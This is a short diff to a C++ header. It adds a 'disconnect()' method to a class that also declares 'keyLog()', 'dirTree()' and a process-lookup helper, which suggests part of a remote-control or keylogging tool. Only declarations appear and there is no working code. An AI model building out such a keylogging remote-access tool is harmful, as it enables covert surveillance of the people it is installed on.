@@ -36,6 +36,8 @@ public:
     Response keyLog();
 
     Response dirTree(); 
+
+    Response disconnect();
 };
 
 DWORD GetProcessIdByName(const char* processName);
